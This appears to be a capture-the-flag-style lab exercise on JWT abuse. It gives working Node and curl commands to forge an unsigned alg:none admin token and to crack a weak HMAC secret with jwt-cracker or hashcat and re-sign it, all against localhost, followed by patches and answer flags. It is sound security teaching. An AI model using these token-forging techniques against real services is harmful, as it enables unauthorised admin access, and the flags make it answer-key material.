# Exercise 03 — JWT Abuse: Algorithm Confusion & Weak Secrets
## Forging Your Own Admin Token

> **Difficulty:** ⭐⭐⭐⭐☆  
> **Flags to capture:** 2 (+ 1 bonus)  
> **OWASP Category:** [A02:2021 – Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/) + [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
> **Prerequisite:** Exercises 01 & 02 should be conceptually understood.

---

## Your Mission

The app's middleware is now correctly applied (assume Exercises 01 & 02 are
patched). The routes are guarded. The ownership checks are in place.

But you've shifted your focus. Instead of abusing *how* the server validates
tokens, you're going to abuse *what kind of tokens* the server accepts.

Two bugs live in `src/auth.js`. If you exploit either one, you can forge
a JWT that claims `"role": "admin"` — without knowing the real admin's password.

---

## Background: How JWTs Work

A JWT has three parts: `header.payload.signature`

```
eyJhbGciOiJIUzI1NiJ9   ← header (base64): {"alg":"HS256"}
.
eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0  ← payload (base64): {"userId":1,"role":"user"}
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c  ← HMAC signature
```

The server signs the token with a secret. On each request, it re-computes
the signature and compares. If they match — it trusts the payload.

The attacks in this exercise break that trust in two different ways.

---

## Attack A: Algorithm Confusion (`alg: none`)

### How it works

The JWT spec includes a special algorithm value: `"none"`.
When `alg` is `"none"`, the token has **no signature** — the field is empty.

A vulnerable server that doesn't whitelist allowed algorithms will accept these
tokens as valid — because `jwt.verify()` without an `algorithms` option
won't reject unsigned tokens.

### Tools you need

```bash
# Install globally (or use npx)
npm install -g jwt-cli
# or just use Node inline — see below
```

### Craft the attack

**Step 1 — Get a real token to inspect:**
```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

# Decode without verifying (just inspect)
echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | jq .
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
```

**Step 2 — Craft an `alg:none` token in Node:**
```bash
node -e "
const header  = Buffer.from(JSON.stringify({alg:'none',typ:'JWT'})).toString('base64url');
const payload = Buffer.from(JSON.stringify({userId:99,role:'admin',iat:Math.floor(Date.now()/1000)})).toString('base64url');
const token   = header + '.' + payload + '.';
console.log(token);
"
```

**Step 3 — Use the forged token:**
```bash
FORGED=<paste token from step 2>

curl -s http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $FORGED" | jq .
```

If vulnerable: you receive the admin user list with the flag.  
If patched: you receive 401 Invalid token.

---

## Attack B: Weak Secret Cracking

### How it works

The JWT is signed with HMAC-SHA256 using a secret key. If that secret is weak —
a common word, short string, or default value — an attacker can crack it
offline using a wordlist attack, then re-sign any payload they want.

### Tools you need

```bash
# hashcat (GPU-accelerated, very fast)
# or: jwt-cracker (pure JS, slower but easy)
npm install -g jwt-cracker
```

### Crack the secret

```bash
# Get a real token first
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

# Run jwt-cracker (wordlist attack)
jwt-cracker $TOKEN
# Or if using hashcat:
# echo $TOKEN > token.txt
# hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

> Hint: The secret is a single common English word. It will crack in under a second.

### Re-sign with admin payload

```bash
node -e "
const jwt = require('jsonwebtoken');
const SECRET = '<the cracked secret>';
const forged = jwt.sign({userId:99, role:'admin'}, SECRET, {algorithm:'HS256'});
console.log(forged);
"
```

### Use the re-signed token

```bash
FORGED=<paste forged admin token>

curl -s http://localhost:3000/api/admin/users \
  -H "Authorization: Bearer $FORGED" | jq .
```

---

## Phase 3: Root Cause Analysis

Open `src/auth.js`.

**Bug #7 (alg:none):**
- Find the `jwt.verify()` call.
- What third argument (options) is passed?
- What option should be added to reject `alg:none`?

**Bug #8 (weak secret):**
- Find `JWT_SECRET`.
- What is its value?
- What would a production-grade secret look like?

---

## Phase 4: Patch

### Fix Bug #7 — Algorithm Confusion
```javascript
// Before:
const decoded = jwt.verify(token, JWT_SECRET);

// After:
const decoded = jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });
```

This tells `jwt.verify()` to explicitly reject any token not signed with HS256 —
including `alg:none` tokens.

### Fix Bug #8 — Weak Secret
```javascript
// Before:
const JWT_SECRET = 'secret';

// After (use an environment variable):
const JWT_SECRET = process.env.JWT_SECRET;
if (!JWT_SECRET) throw new Error('JWT_SECRET environment variable is not set');
```

Then generate a strong secret:
```bash
# Generate a 256-bit random secret
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"

# Set it before starting:
JWT_SECRET=<your_generated_secret> npm start
```

---

## Phase 5: Verify

```bash
npm run test:03
```

---

## Bonus Challenge ⭐

After patching both bugs, try this:

1. Crack a token from a **different** service that also uses `"secret"` as its JWT secret.
2. Research **JWT Key Confusion attacks** (RS256 → HS256 confusion) — a third JWT vulnerability not covered in this lab.
3. Look up [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) — the original `alg:none` disclosure.

---

## Flags

| # | Flag | How |
|---|---|---|
| 7 | `BAC{jwt_alg_none_accepted}` | Forge `alg:none` admin token, hit `/api/admin/users` |
| 8 | `BAC{jwt_weak_secret_cracked}` | Crack secret, re-sign admin token, hit `/api/admin/users` |

---

## Further Reading

- [JWT.io Debugger](https://jwt.io)
- [PortSwigger: JWT Attacks](https://portswigger.net/web-security/jwt)
- [Auth0: Critical Vulnerabilities in JWT](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [OWASP JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
